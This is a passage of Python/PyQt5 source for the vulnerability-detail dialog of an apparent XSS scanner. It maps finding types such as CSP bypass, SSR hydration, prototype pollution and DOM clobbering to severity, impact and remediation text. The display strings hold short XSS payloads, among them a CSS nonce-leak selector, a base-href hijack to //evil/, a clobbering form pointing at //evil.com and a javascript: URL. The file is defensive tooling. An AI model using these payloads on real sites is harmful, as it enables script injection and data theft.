            "  serialize-javascript or htmlescape. "
            "2) For hydration markers, use base64 encoding — never raw JSON. "
            "3) HTTP CSP header (not meta tag) — meta tags don't help pre-hydration. "
            "4) Validate user input doesn't contain --> / </script> / <!-- before "
            "  it reaches SSR error boundaries or hydration state. "
            "5) Audit all places that emit JSON into HTML — including comment markers, "
            "  hidden input value attributes, data-* attributes, JS string literals."
        ),
        # ── v10.6: CSP Bypass Detection (94.72% bypassable, Tranco 50k 2023) ──
        "csp-bypass": (
            "HIGH",
            "#0891b2",   # teal — modern CSP audit family
            [
                "CSP Bypass detected — policy is not effective against XSS",
                "Tranco Top 50k research (2023): 94.72%% of CSP policies bypassable",
                "26%% of nonce-based policies reuse nonces (defeats nonce protection)",
                "6 detection layers covered:",
                "  (A) Whitelist entries with known JSONP bypasses",
                "      Examples: *.googleapis.com (ajax.googleapis.com hosts JSONP),",
                "      cdnjs.cloudflare.com (vulnerable libs), *.amazonaws.com (S3 abuse)",
                "  (B) Unsafe directives:",
                "      'unsafe-inline' without nonce/hash/strict-dynamic = CSP off",
                "      'unsafe-eval' permits eval(), Function(), setTimeout(string)",
                "      Missing base-uri = <base href='//evil/'> redirects all relative scripts",
                "      Missing object-src = <object data='evil.swf'> bypass",
                "  (C) Nonce reuse — same nonce returned across requests",
                "  (D) Meta-tag CSP — readable via CSS attribute selectors",
                "      Pattern: *[content^='nonce-a']{background:url(/leak?n=a)}",
                "      Combined with HTML injection → exfiltrate nonce char-by-char",
                "  (E) Wildcard host risk — *.com / *.io = essentially '*'",
                "  (F) CSS injection sinks (CVE-2026-2441 pattern)",
                "      Template variables in <style> blocks → CSS-based DOM exfiltration",
            ],
            "REMEDIATION: 1) Use Google CSP Evaluator (csp-evaluator.withgoogle.com) "
            "as a reference. 2) Prefer 'strict-dynamic' + nonce over host whitelists — "
            "this is Google's recommended modern pattern. 3) Always use HTTP header CSP, "
            "never <meta http-equiv> — meta is leakable via CSS. 4) Generate fresh nonces "
            "per response, NEVER cache pages with nonces (set Cache-Control: no-store on "
            "any page with embedded nonces). 5) Add base-uri 'none' and object-src 'none' "
            "explicitly — these are commonly forgotten. 6) Remove ALL of: 'unsafe-inline', "
            "'unsafe-eval', wildcards in script-src, JSONP-hosting domains "
            "(googleapis.com, cdnjs, etc.). 7) For style-src: use nonces, never "
            "'unsafe-inline'. CSS exfiltration (CVE-2026-2441) is a real 2026 threat. "
            "8) Test the resulting policy against your app — many strict policies "
            "break legitimate functionality, requiring careful migration."
        ),
    }

    def __init__(self, details: dict, parent=None):
        super().__init__(parent)
        self.details = details or {}
        self._vd_drag = None
        self._vd_centered = False
        self._setup_ui()

    # ── frameless-window helpers (drag by header + centre on parent) ──
    def _vd_bar_press(self, e):
        if e.button() == Qt.LeftButton:
            self._vd_drag = e.globalPos() - self.frameGeometry().topLeft()
            e.accept()

    def _vd_bar_move(self, e):
        if self._vd_drag is not None and (e.buttons() & Qt.LeftButton):
            self.move(e.globalPos() - self._vd_drag)
            e.accept()

    def showEvent(self, e):
        super().showEvent(e)
        if self._vd_centered:
            return
        self._vd_centered = True
        try:
            par = self.parent()
            ref = (par.window().frameGeometry()
                   if (par is not None and par.window() is not None) else None)
            if ref is None:
                ref = QApplication.primaryScreen().availableGeometry()
            self.move(ref.center() - self.rect().center())
        except Exception:
            pass

    def _setup_ui(self):
        self.setWindowTitle("Vulnerability Detail")
        self.setMinimumWidth(820)
        self.setMinimumHeight(680)
        self.setModal(True)
        # Frameless → the SAME slim header + single ✕ as the Attack-graph window
        # (instead of the native title-bar ?/× in a different look).
        self.setWindowFlags(Qt.Dialog | Qt.FramelessWindowHint)

        # Minimalistický stylesheet — textové barvy nastavujeme per-widget,
        # neřešíme v globálním sheetu (PyQt5 quirk s HTML spans).
        self.setStyleSheet(f"""
            QDialog {{
                background: {theme('bg_deep')};
                border: 1px solid {theme('border_input')};
            }}
            QScrollArea {{
                background: {theme('bg_deep')};
                border: none;
            }}
            QScrollArea > QWidget > QWidget {{
                background: {theme('bg_deep')};
            }}
            QPlainTextEdit {{
                background: {theme('bg_card')};
                color: {theme('fg')};
                border: 1px solid {theme('border')};
                border-radius: 7px;
                font-family: 'JetBrains Mono', 'Courier New', monospace;
                font-size: 12px;
                padding: 10px;
                selection-background-color: {theme('accent')};
            }}
            QPushButton {{
                background: {theme('bg_btn')};
                color: {theme('fg_btn')};
                border: 1px solid {theme('border_input')};
                border-radius: 3px;
                padding: 9px 20px;
                font-size: 12px;
            }}
            QPushButton:hover {{
                background: {theme('bg_btn_hover')};
                border-color: {theme('accent')};
            }}
            QPushButton#primaryBtn {{
                background: {theme('accent')};
                color: #fff;
                border: 1px solid {theme('accent')};
            }}
            QPushButton#primaryBtn:hover {{
                background: {theme('accent_hover')};
                border-color: {theme('accent_hover')};
            }}
        """)

        # ── ROOT: scroll area + inner content widget ──
        # Scroll area aby se dlouhý obsah vešel i v menších oknech
        outer = QVBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.setSpacing(0)

        # ── Slim frameless header — identical treatment to the Attack-graph
        # full-window bar (same bg_header colour, border, uppercase title, ✕). ──
        _bar = QWidget(); _bar.setObjectName("vd_bar")
        _bar.setStyleSheet(
            f"QWidget#vd_bar {{ background: {theme('bg_header')}; "
            f"border-bottom: 1px solid {theme('border')}; }}")
        _bl = QHBoxLayout(_bar); _bl.setContentsMargins(18, 9, 10, 9); _bl.setSpacing(12)
        _vtitle = QLabel("VULNERABILITY DETAIL")
        _vtitle.setStyleSheet(
            f"color:{theme('fg_strong')}; font-size:12px; font-weight:bold; "
            "letter-spacing:3px;")
        _vhint = QLabel("press Esc to close")
        _vhint.setStyleSheet(f"color:{theme('fg_muted')}; font-size:11px;")
        _bl.addWidget(_vtitle); _bl.addStretch(1); _bl.addWidget(_vhint)
        _vx = QPushButton("✕"); _vx.setObjectName("vd_close")
        _vx.setToolTip("Close"); _vx.setFixedSize(30, 26)
        _vx.setCursor(Qt.PointingHandCursor)
        _vx.setStyleSheet(
            f"QPushButton#vd_close{{background:transparent; color:{theme('fg_muted')}; "
            f"border:none; font-size:15px; border-radius:5px; padding:0;}}"
            f"QPushButton#vd_close:hover{{background:{theme('bg_btn_hover')}; "
            f"color:{theme('fg_strong')};}}")
        _vx.clicked.connect(self.reject)
        _bl.addWidget(_vx)
        _bar.mousePressEvent = self._vd_bar_press
        _bar.mouseMoveEvent = self._vd_bar_move
        outer.addWidget(_bar)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.NoFrame)

        content = QWidget()
        scroll.setWidget(content)

        root = QVBoxLayout(content)
        root.setContentsMargins(22, 20, 22, 16)
        root.setSpacing(14)

        outer.addWidget(scroll, 1)

        # ── Extrahovat data ──
        url     = str(self.details.get("url", "") or "—")
        param   = str(self.details.get("param", self.details.get("display_param", "")) or "—")
        context = str(self.details.get("context", "") or "—")
        payload = str(self.details.get("payload", "") or "")
        source  = str(self.details.get("source", "seed") or "seed")
        status  = str(self.details.get("status", "") or "—")
        waf_raw = self.details.get("waf", "")
        waf     = waf_raw.get("name", "") if isinstance(waf_raw, dict) else str(waf_raw or "")
        csp     = str(self.details.get("csp_note", "") or "")

        # Normalizovat context
        context_key = context
        if "(" in context:
            context_key = context.split("(")[0].strip()

        # ── v4-v7: specializované findings mají vlastní IMPACT_MAP entries
        # — bere precedenci nad gate-derived severity, protože každá je
        # samostatná třída zranitelností.
        ti = self.details.get("template_injection")
        mxss = self.details.get("mxss_finding")
        dom_v6 = self.details.get("dom_v6_finding")
        static_js = self.details.get("static_js_finding")
        trusted_types = self.details.get("trusted_types_finding")
        stored_rt = self.details.get("stored_roundtrip_finding")
        proto_pp = self.details.get("proto_pollution_finding")
        dom_clob = self.details.get("dom_clobbering_finding")
        ssr_h = self.details.get("ssr_hydration_finding")
        csp_b = self.details.get("csp_bypass_finding")
        source_key = self.details.get("source", "") or ""
        if ti and isinstance(ti, dict):
            context_key = "template_injection"
        elif proto_pp and isinstance(proto_pp, dict):
            kind = proto_pp.get("kind", "")
            # v10.10: kind is now per-CVE (cve-2024-47875, cve-2025-26791, etc.)
            # — match any CVE prefix instead of single hardcoded value.
            context_key = ("proto-pollution-cve" if kind.startswith("cve-")
                           else "proto-pollution-chain")
        elif source_key == "proto-pollution":
            context_key = "proto-pollution-chain"
        elif dom_clob and isinstance(dom_clob, dict):
            context_key = "dom-clobbering"
        elif source_key == "dom-clobbering":
            context_key = "dom-clobbering"
        elif ssr_h and isinstance(ssr_h, dict):
            kind = ssr_h.get("kind", "")
            context_key = ("ssr-hydration-cve" if kind == "framework-cve"
                           else "ssr-hydration-injection")
        elif source_key == "ssr-hydration":
            context_key = "ssr-hydration-injection"
        elif csp_b and isinstance(csp_b, dict):
            context_key = "csp-bypass"
        elif source_key == "csp-bypass":
            context_key = "csp-bypass"
        elif stored_rt and isinstance(stored_rt, dict):
            context_key = "stored-roundtrip"
        elif source_key == "stored-roundtrip":
            context_key = "stored-roundtrip"
        elif trusted_types and isinstance(trusted_types, dict):
            kind = trusted_types.get("kind", "")
            context_key = ("trusted-types-policy" if kind == "policy"
                           else "trusted-types-csp")
        elif source_key == "trusted-types":
            context_key = "trusted-types-csp"
        elif static_js and isinstance(static_js, dict):
            context_key = "static-js-taint"
        elif source_key == "static-js":
            context_key = "static-js-taint"
        elif dom_v6 and isinstance(dom_v6, dict):
            context_key = "dom-v6-taint"
        elif source_key == "dom-v6":
            context_key = "dom-v6-taint"
        elif mxss and isinstance(mxss, dict):
            context_key = "mutation-xss-static"
        elif source_key == "mutation-xss-static":
            context_key = "mutation-xss-static"

        impact_entry = self.IMPACT_MAP.get(
            context_key,
            self.IMPACT_MAP.get(context, None),
        )
        if impact_entry is None:
            severity = "MEDIUM"
            sev_color = "#f59e0b"
            impact_list = ["XSS reflection detected in an unclassified context."]
            remediation = "Audit manually + apply context-appropriate output encoding."
        else:
            full_severity, sev_color, impact_list, remediation = impact_entry
            # Strip emoji z severity (mohl by se mizerně renderovat)
            severity = full_severity.strip()

        # ══════════════════════════════════════════════════════════════
        # v2/v3 GATE OVERRIDE — context-engine + active probe verdict je
        # autoritativnější než context-name lookup. Pokud máme gate info,
        # použij ho jako primární severity, IMPACT_MAP zůstává jako popis
        # impactu pro daný context family.
        # ══════════════════════════════════════════════════════════════
        gate_klass = str(self.details.get("gate_klass") or "")
        gate_severity = str(self.details.get("gate_severity") or "")
        render_probe = str(self.details.get("render_probe") or "")
        gate_renderability = str(self.details.get("gate_renderability") or "")
        gate_content_type = str(self.details.get("gate_content_type") or "")

        # Klasa labels — co se zobrazí jako badge
        klass_to_badge = {
            "xss_executable": ("XSS",      "#ef4444"),
            "tag_injection":  ("TAG INJ",  "#f97316"),
            "text_only":      ("TEXT",     "#94a3b8"),
            "unknown":        ("UNKNOWN",  "#666666"),
        }
        # Pokud máme gate verdict, override severity — ALE template/mXSS
        # findings mají vlastní severity z IMPACT_MAP (CRITICAL/MEDIUM)
        # nezávislou na běžném context-engine verdiktu.
        skip_gate_override = bool(
            ti or mxss or dom_v6 or static_js or trusted_types or stored_rt
            or proto_pp or dom_clob or ssr_h or csp_b
            or source_key in ("mutation-xss-static", "dom-v6", "static-js",
                              "trusted-types", "stored-roundtrip",
                              "proto-pollution", "dom-clobbering",
                              "ssr-hydration", "csp-bypass")
        )
        if gate_klass and not skip_gate_override:
            badge_text, klass_color = klass_to_badge.get(
                gate_klass, ("FINDING", "#94a3b8"))
            # Severity based on gate (capped by content-type downgrade)
            sev_map = {"critical": ("CRITICAL", "#ff2d55"),
                       "high":     ("HIGH",     "#ef4444"),
                       "medium":   ("MEDIUM",   "#f59e0b"),
                       "low":      ("LOW",      "#94a3b8"),
                       "informational": ("INFO", "#666666")}
            if gate_severity in sev_map:
                severity, sev_color = sev_map[gate_severity]

            # Pokud probe explicitně řekla "inert" — drasticky downgradovat
            if render_probe == "inert":
                severity = "INFORMATIONAL"
                sev_color = "#666666"
                impact_list = [
                    "Active render probe confirmed: the server sanitizes the payload.",
                    "The reflection is text-only — no HTML/JS execution primitive survived.",
                    "This is NOT exploitable XSS — it's information disclosure (the server accepts the input).",
                ] + impact_list
            elif render_probe == "executable":
                # Conversely — the probe confirmed an exec primitive, the finding is serious
                impact_list = [
                    "✓ Active render probe CONFIRMED: a breakout primitive survives in executable form.",
                ] + impact_list

            # Renderability hint
            if gate_renderability and gate_renderability not in ("html_rendered", "unknown"):
                impact_list.append(
                    f"⚠ The response Content-Type is {gate_content_type or '?'} "
                    f"({gate_renderability}) — exploitation depends on a DOM sink "
                    f"that consumes this value (innerHTML, eval, etc.).")

        # ── v4: Template injection section — shows framework + probe payload ──
        if ti and isinstance(ti, dict):
            fw = ti.get("framework", "?")
            ver = ti.get("version", "")
            ver_str = f" v{ver}" if ver else ""
            ctx = ti.get("expression_context", "?")
            probe_pl = ti.get("probe_payload", "")
            ti_conf = ti.get("ti_confidence", 0)
            impact_list = [
                f"🎯 Detected framework: {fw.upper()}{ver_str} "
                f"(confidence {ti_conf:.0%})",
                f"📍 Reflection in context: {ctx}",
                f"💉 Probe payload used: {probe_pl[:80]}",
                f"⚠ The framework will EVALUATE this payload as a JS expression "
                f"on render — it doesn't need <script> or on*= to execute.",
            ] + impact_list

        # ── v4: mXSS section — sanitizer + recommendation ──
        if mxss and isinstance(mxss, dict):
            san = mxss.get("sanitizer", "?")
            sinks = mxss.get("innerhtml_sinks", 0)
            risk = mxss.get("risk_score", 0)
            impact_list = [
                f"🧪 Detected sanitizer: {san}",
                f"📍 innerHTML sinks on the page: {sinks}",
                f"📊 Static risk score: {risk:.2f}",
                f"⚠ The page combines a sanitizer + innerHTML — a pattern prone "
                f"to mXSS bypass. Manual verification with a payload bank is recommended.",
            ] + impact_list

        # ── v6: DOM taint analysis section ──
        if dom_v6 and isinstance(dom_v6, dict):
            target_param = dom_v6.get("target_param", "?")
            chain_count = dom_v6.get("chain_count", 0)
            sink_count = dom_v6.get("sink_count", 0)
            source_count = dom_v6.get("source_count", 0)
            label_str = dom_v6.get("label", "?")
            chains = dom_v6.get("taint_chains", []) or []
            top_lines = [
                f"🎯 Parameter: {target_param}",
                f"🔗 Source→sink chains: {chain_count}",
                f"📊 Source reads: {source_count}, sink hits: {sink_count}",
                f"🏷 Label: {label_str}",
            ]
            if chains:
                tc = chains[0]
                top_lines.append(
                    f"⚡ {tc.get('source','?')} → {tc.get('sink','?')} "
                    f"(canary {tc.get('marker','')[:12]}, Δ{tc.get('delta_ms','?')}ms)"
                )
            top_lines.append(
                "⚠ Runtime Chromium detected tainted data flowing from "
                "URL/storage/postMessage into an exec sink."
            )
            impact_list = top_lines + impact_list

        # ── v7: Static JS analyzer section ──
        if static_js and isinstance(static_js, dict):
            sjs_source = static_js.get("source", "?")
            sjs_sink = static_js.get("sink", "?")
            sjs_file = static_js.get("file", "?")
            sjs_line = static_js.get("line", 0)
            sjs_severity = static_js.get("severity", "?")
            sjs_origin = static_js.get("origin", "?")
            sjs_snippet = static_js.get("snippet", "")
            chain_list = static_js.get("chain", []) or []
            chain_str = " → ".join(c[0] if isinstance(c, (list, tuple)) else str(c)
                                   for c in chain_list[:6])
            top_lines = [
                f"🎯 Source: {sjs_source}",
                f"💥 Sink: {sjs_sink}",
                f"📁 File: {sjs_file}:{sjs_line} ({sjs_origin})",
                f"⚠ Severity: {sjs_severity.upper()}",
            ]
            if chain_str:
                top_lines.append(f"🔗 Chain: {chain_str}")
            if sjs_snippet:
                top_lines.append(f"📜 Code: {sjs_snippet[:100]}")
            top_lines.append(
                "ℹ Static AST analysis found this chain without needing to "
                "run the JS. Cross-reference with DOM v6 / headless verifier."
            )
            impact_list = top_lines + impact_list

        # ── v8: Trusted Types analyzer sekce ──
        if trusted_types and isinstance(trusted_types, dict):
            tt_kind = trusted_types.get("kind", "?")
            tt_severity = trusted_types.get("severity", "?")
            top_lines = []
            if tt_kind == "policy":
                pname = trusted_types.get("policy_name", "?")
                is_default = trusted_types.get("is_default", False)
                tt_file = trusted_types.get("file", "?")
                tt_line = trusted_types.get("line", 0)
                methods = trusted_types.get("methods_defined", []) or []
                insecure = trusted_types.get("insecure_methods", []) or []
                top_lines.append(f"🎯 Policy name: {pname}"
                                 + ("  ⚠ DEFAULT (silent backdoor risk)"
                                    if is_default else ""))
                top_lines.append(f"📁 Definice: {tt_file}:{tt_line}")
                top_lines.append(f"🔧 Methods defined: "
                                 f"{', '.join(methods) if methods else '—'}")
                if insecure:
                    for im in insecure[:3]:
                        m = im.get("method", "?") if isinstance(im, dict) else "?"
                        r = im.get("reason", "?") if isinstance(im, dict) else "?"
                        top_lines.append(f"💥 {m}: {r}")
                top_lines.append(f"⚠ Severity: {tt_severity.upper()}")
                snip = trusted_types.get("snippet", "")
                if snip:
                    top_lines.append(f"📜 Code: {snip[:100]}")
            else:  # csp
                top_lines.append(
                    f"🎯 CSP Trusted Types config "
                    f"({'enforced' if trusted_types.get('enforced') else 'NOT enforced'}"
                    f"{'  +  report-only' if trusted_types.get('report_only') else ''})"
                )
                pols = trusted_types.get("policies", []) or []
                if pols:
                    top_lines.append(f"📋 Allowed policies: {', '.join(pols)}")
                if trusted_types.get("wildcard"):
                    top_lines.append("💥 trusted-types * (wildcard) — defeats whole purpose")
                if trusted_types.get("has_default"):
                    top_lines.append("💥 'default' policy in allowlist — implicit conversion risk")
                issues = trusted_types.get("issues", []) or []
                for iss in issues[:3]:
                    top_lines.append(f"⚠ {iss}")
            impact_list = top_lines + impact_list

        # ── v9: Stored XSS round-trip sekce ──
        if stored_rt and isinstance(stored_rt, dict):
            origin_url = stored_rt.get("origin_url", "?")
            origin_param = stored_rt.get("origin_param", "?")
            origin_method = stored_rt.get("origin_method", "POST")
            reflection_url = stored_rt.get("reflection_url", "?")
            is_admin = stored_rt.get("is_admin_context", False)
            canary = stored_rt.get("canary", "?")
            snippet = stored_rt.get("snippet", "")
            top_lines = [
                f"🎯 Origin: {origin_method} {origin_param}@{origin_url[:80]}",
                f"💥 Reflexe: {reflection_url[:90]}",
                f"🔖 Canary: {canary}",
            ]
            if is_admin:
                top_lines.append(
                    "⚠ ADMIN CONTEXT — the attacker gets an admin session → "
                    "potentially full ATO (Account Takeover)"
                )
                top_lines.append("⚠ Severity: CRITICAL")
            else:
                top_lines.append(
                    "⚠ Public reflection — the payload is shown to other users"
                )
                top_lines.append("⚠ Severity: HIGH")
            if snippet:
                top_lines.append(f"📜 Context: ...{snippet[:140]}...")
            top_lines.append(
                "ℹ Classic stored XSS pattern — the payload is stored in DB/cache, "
                "rendered on a different URL than where it was POSTed."
            )
            impact_list = top_lines + impact_list

        # ── v10: Prototype Pollution → XSS chain section ──
        if proto_pp and isinstance(proto_pp, dict):
            kind = proto_pp.get("kind", "?")
            sev = proto_pp.get("severity", "?")
            src_pat = proto_pp.get("source_pattern", "?")
            src_file = proto_pp.get("source_file", "?")
            src_file_short = (src_file.rsplit("/", 1)[-1]
                              if "/" in src_file else src_file)
            src_line = proto_pp.get("source_line", 0)
            src_origin = proto_pp.get("source_origin", "unknown")
            top_lines = [
                f"🎯 Pollution source: {src_pat}",
                f"📁 @ {src_file_short}:{src_line}",
                f"🔗 Source origin: {src_origin}"
                + ("  ⚠ TAINTED" if src_origin == "user-input" else ""),
            ]
            if kind.startswith("cve-"):
                # v10.10: detail dialog uses CVE metadata from finding_dict
                # (populated by engine from _dompurify_cve_feed.py).
                dp_ver = proto_pp.get("dompurify_version", "<unknown>")
                cve_id = proto_pp.get("cve", kind.upper())
                cve_sev = proto_pp.get("severity", "high")
                cve_vector = proto_pp.get("cve_vector", "")
                cve_desc = proto_pp.get("cve_description", "")
                cve_payload = proto_pp.get("cve_payload", "")
                cve_ref = proto_pp.get("cve_reference", "")
                top_lines.append(
                    f"💥 {cve_id} chain ({cve_sev}): source → DOMPurify {dp_ver}"
                )
                if cve_vector:
                    top_lines.append(f"🔬 Vector: {cve_vector}")
                if cve_desc:
                    top_lines.append(f"📖 {cve_desc}")
                if cve_payload:
                    # Truncate long payloads for display
                    payload_disp = (cve_payload[:120] + "..."
                                     if len(cve_payload) > 120 else cve_payload)
                    top_lines.append(f"💥 PoC: {payload_disp}")
                top_lines.append(
                    f"⚠ Severity: {cve_sev.upper()} "
                    f"(known CVE, public PoC, wide impact)"
                )
                top_lines.append(
                    "⚠ DOMPurify has 24M+ weekly downloads — affected industry-wide"
                )
                if cve_ref:
                    top_lines.append(f"🔗 Reference: {cve_ref}")
            else:
                gad_prop = proto_pp.get("gadget_property", "?")
                gad_kind = proto_pp.get("gadget_kind", "?")
                gad_file = proto_pp.get("gadget_file", "?")
                gad_file_short = (gad_file.rsplit("/", 1)[-1]
                                  if "/" in gad_file else gad_file)
                gad_line = proto_pp.get("gadget_line", 0)
                top_lines.append(
                    f"💥 Gadget: '{gad_prop}' ({gad_kind})"
                )
                top_lines.append(f"📁 @ {gad_file_short}:{gad_line}")
                top_lines.append(
                    f"💥 PoC: ?__proto__[{gad_prop}]=<payload>"
                )
                top_lines.append(f"⚠ Severity: {sev.upper()}")
            snippet = proto_pp.get("snippet", "")
            if snippet:
                top_lines.append(f"📜 Source snippet: {snippet[:140]}")
            impact_list = top_lines + impact_list

        # ── v10.4: DOM Clobbering → XSS chain section (Intigriti 2026) ──
        if dom_clob and isinstance(dom_clob, dict):
            sanitizer = dom_clob.get("sanitizer", "?")
            san_file = dom_clob.get("sanitizer_file", "?")
            san_file_short = (san_file.rsplit("/", 1)[-1]
                              if "/" in san_file else san_file)
            san_line = dom_clob.get("sanitizer_line", 0)
            sink_pat = dom_clob.get("sink_pattern", "?")
            sink_recv = dom_clob.get("sink_receiver", "?")
            sink_kind = dom_clob.get("sink_kind", "?")
            sink_file = dom_clob.get("sink_file", "?")
            sink_file_short = (sink_file.rsplit("/", 1)[-1]
                               if "/" in sink_file else sink_file)
            sink_line = dom_clob.get("sink_line", 0)
            top_lines = [
                f"🎯 Sanitizer: {sanitizer}.sanitize() missing FORBID_ATTR",
                f"📁 @ {san_file_short}:{san_line}",
                f"💥 Clobberable sink: {sink_pat}",
                f"📁 @ {sink_file_short}:{sink_line}",
                f"⚠ Sink kind: {sink_kind}",
                f"💥 PoC injection: <form name=\"{sink_recv}\" "
                f"data-next=\"//evil.com\" data-append=\"true\">",
                f"💥 Or: <a id=\"{sink_recv}\" href=\"javascript:alert(1)\">",
                f"⚠ Severity: HIGH (Intigriti March 2026 CTF pattern)",
                f"⚠ Both DOMPurify AND CSP can be bypassed by this chain",
            ]
            snippet = dom_clob.get("snippet", "")
            if snippet:
                top_lines.append(f"📜 Sink snippet: {snippet[:140]}")
            impact_list = top_lines + impact_list

        # ── v10.5: SSR Hydration XSS section (CVE-2026-27902 family) ──
        if ssr_h and isinstance(ssr_h, dict):
            kind = ssr_h.get("kind", "?")
            sev = ssr_h.get("severity", "?")
            framework = ssr_h.get("framework", "?")
            version = ssr_h.get("version") or "?"
            cve = ssr_h.get("cve") or ""
            line_no = ssr_h.get("line", 0)
            top_lines = []
            if kind == "framework-cve":
                top_lines = [
                    f"🎯 CVE detected: {cve}",
                    f"📦 Framework: {framework} {version}",
                    f"⚠ Severity: {sev.upper()} (known CVE, public PoC)",
                ]
                if cve == "CVE-2026-27902":
                    top_lines.extend([
                        "💥 PoC: trigger SSR error boundary with --> in error string",
                        "💥 Result: <!--{...-->ATTACKER_HTML<!--...-->",
                        "💥 Browser: comment ends early, ATTACKER_HTML renders, XSS",
                        "⚠ Pre-hydration XSS — bypasses CSP-via-meta + Trusted Types",
                    ])
                elif cve == "CVE-2026-27125":
                    top_lines.extend([
                        "💥 mXSS via attribute spread in SSR rendering",
                        "💥 Affects Svelte 5.x <5.51.5",
                        f"⚠ Upgrade to Svelte 5.51.5+ immediately",
                    ])
                elif cve == "CVE-2024-45047":
                    top_lines.extend([
                        "💥 mXSS via <noscript> attribute escaping",
                        "💥 Affects Svelte <4.2.19",
                        f"⚠ Upgrade to Svelte 4.2.19+ immediately",
                    ])
            elif kind == "comment-break":
                top_lines = [
                    "🎯 SSR comment-break pattern detected",
                    f"📁 Line {line_no}",
                    "💥 JSON-in-HTML-comment was prematurely closed by --> in body",
                    "💥 Attacker content lands in DOM context between two comments",
                    "💥 Pattern matches CVE-2026-27902 (Svelte 5 transformError)",
                    f"⚠ Severity: {sev.upper()}",
                ]
            elif kind == "script-break":
                top_lines = [
                    "🎯 SSR script-break pattern detected",
                    f"📁 Line {line_no}",
                    "💥 <script type=\"application/json\"> body contains literal </script>",
                    "💥 Browser closes script tag at first </script>, attacker JS follows",
                    "💥 Fix: serialize </script> as <\\/script> in JSON output",
                    f"⚠ Severity: {sev.upper()}",
                ]
            elif kind == "reflected-in-hydration":
                top_lines = [
                    "🎯 Reflected canary in hydration JSON",
                    f"📁 Line {line_no}",
                    "💥 User-controlled input found inside <script type='application/json'> "
                    "or JSON-in-HTML-comment",
                    "💥 Pre-hydration XSS surface — payload executes before client JS loads",
                    "💥 Try: payload with --> (comment), </script (script), or unicode ctrl chars",
                    f"⚠ Severity: {sev.upper()}",
                ]
            excerpt = ssr_h.get("excerpt", "")
            if excerpt:
                top_lines.append(f"📜 Excerpt: {excerpt[:140]}")
            impact_list = top_lines + impact_list

        # ── v10.6: CSP Bypass section (94.72%% policies bypassable) ──
        if csp_b and isinstance(csp_b, dict):
            layer = csp_b.get("layer", "?")
            sev = csp_b.get("severity", "?")
            directive = csp_b.get("directive", "?")
            offending = csp_b.get("offending_value", "?")
            issue = csp_b.get("issue", "?")
            payload_poc = csp_b.get("bypass_payload", "")
            top_lines = [
                f"🎯 CSP layer: {layer}",
                f"⚠ Severity: {sev.upper()}",
                f"📁 Directive: {directive}",
                f"💥 Offending: {offending[:120]}",
                f"📜 Issue: {issue[:200]}",
            ]
            if payload_poc:
                top_lines.append(f"💥 PoC: {payload_poc[:160]}")
            # Layer-specific extras
            if layer == "whitelist-jsonp":
                top_lines.append("⚠ Bypass via JSONP endpoint on whitelisted domain")
            elif layer == "unsafe-directive":
                top_lines.append("⚠ Whole class of XSS unblockable by this CSP")
            elif layer == "nonce-reuse":
                top_lines.append("⚠ Tranco 50k: 26%% sites have this issue")
            elif layer == "meta-tag-csp":
                top_lines.append("⚠ Combined with HTML injection → exfiltrate nonce via CSS")
            elif layer == "wildcard-host":
                top_lines.append("⚠ Top-level wildcard ≈ '*' for practical purposes")
            elif layer == "css-injection":
                top_lines.append("⚠ CVE-2026-2441 pattern — CSS exfiltration via attribute selectors")
            impact_list = top_lines + impact_list

        # ── v5: Headless DOM verifier verdict ──
        # Definitivní verdict z reálného Chromium — má NEJVYŠŠÍ autoritu.
        # Když máme `executed`, finding je 100 % CONFIRMED.
        # Když máme `not_executed`, finding je s vysokou jistotou FP.
        hv_verdict = self.details.get("headless_verdict", "") or ""
        hv_executed = bool(self.details.get("headless_executed", False))
        hv_method = self.details.get("headless_method", "") or ""
        if hv_verdict:
            if hv_executed:
                hv_evidence = self.details.get("headless_evidence", "") or ""
                # Severity → CRITICAL, no downgrade
                severity = "CONFIRMED"
                sev_color = "#dc2626"
                impact_list = [
                    f"🚨 HEADLESS BROWSER CONFIRMED EXECUTION",
                    f"🌐 A real Chromium opened the URL and the JavaScript executed.",
                    f"🎯 Detection: {hv_method}",
                    f"📜 Evidence: {hv_evidence[:150]}",
                    f"✓ This is NOT a false positive — Chromium with a full DOM, CSP and JS engine "
                    f"definitively confirmed that the payload executes.",
                ] + impact_list
            elif hv_verdict == "not_executed":
                # The probe ran in Chromium, nothing executed — likely FP
                # We don't override severity (the context engine may be right for
                # specific exploit contexts), but we add a warning.
                impact_list = [
                    f"⚠ The headless verifier (Chromium) is NOT able to replicate execution.",
                    f"💡 Possible reasons: CSP block, framework escaping, sanitizer, "
                    f"or the payload requires user interaction (onclick, hover, etc.).",
                    f"📌 The pre-render heuristic STILL flagged this reflection as "
                    f"suspicious — a manual audit is recommended.",
                ] + impact_list
            elif hv_verdict == "error":
                impact_list = [
                    f"⚠ The headless verifier failed (network / browser error). "
                    f"Verdict inconclusive — a manual audit is required.",
                ] + impact_list

        # ══════════════════════════════════════════════════════════════
        # 1. HEADER — severity badge + název typu zranitelnosti
        # ══════════════════════════════════════════════════════════════
        header_row = QHBoxLayout()
        header_row.setSpacing(14)
        header_row.setContentsMargins(0, 0, 0, 4)

        # Severity badge — pevná šířka, centered text
        sev_badge = QLabel(severity)
        sev_badge.setAlignment(Qt.AlignCenter)
        sev_badge.setFixedHeight(30)
        sev_badge.setMinimumWidth(110)
        sev_badge.setStyleSheet(
            f"background: {sev_color};"
            f"color: #fff;"
            f"font-weight: bold;"
            f"font-size: 12px;"
            f"border-radius: 3px;"
            f"padding: 0 12px;"
            f"letter-spacing: 1px;"
        )
        header_row.addWidget(sev_badge, 0)

        # v10.26: FP-RISK badge — poctivý label pro ko-lokační/neověřené nálezy.
        # fp_risk je hoistnutý na top-level emitovaného hitu (v10.24); fallback
        # na vnořené *_finding detail dicty.
        _fp_risk = self.details.get("fp_risk")
        _pot_sev = self.details.get("potential_severity")
        if _fp_risk is None:
            for _k, _v in self.details.items():
                if _k.endswith("_finding") and isinstance(_v, dict) and "fp_risk" in _v:
                    _fp_risk = _v.get("fp_risk")
                    _pot_sev = _pot_sev or _v.get("potential_severity")
                    break
        if _fp_risk:
            _fp_txt = "⚠ FP-RISK"
            if _pot_sev:
                _fp_txt += f" · potential {str(_pot_sev).upper()}"
            fp_badge = QLabel(_fp_txt)
            fp_badge.setAlignment(Qt.AlignCenter)
            fp_badge.setFixedHeight(30)
            fp_badge.setStyleSheet(
                "background: #2a230b;"
                "color: #fde68a;"
                "font-weight: bold;"
                "font-size: 11px;"
                "border: 1px solid #a16207;"
                "border-radius: 3px;"
